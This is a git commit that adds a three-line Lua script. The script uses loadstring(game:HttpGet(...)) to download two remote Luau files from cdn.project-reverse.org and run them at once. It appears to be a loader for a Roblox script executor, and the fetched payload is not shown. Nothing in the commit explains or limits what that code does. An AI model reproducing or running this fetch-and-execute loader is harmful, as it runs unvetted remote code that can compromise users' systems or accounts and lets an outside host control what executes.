efa27688ba2a8dfa73fa311a3682c047423546d8
xlolo30127 <lolo30127aaaa@outlook.fr>
2026-05-11 05:57:43 -0700

    Add script_j3uWOUjg_1778504261183.lua

---
+++ script_j3uWOUjg_1778504261183.lua
@@ -0,0 +1,3 @@
+ID="97a470b7-85d5-465a-89d4-b114d17dcdc9";
+RUN_AFTER=loadstring(game:HttpGet("https://cdn.project-reverse.org/visual.luau"));
+loadstring(game:HttpGet("https://cdn.project-reverse.org/loader.luau"))();
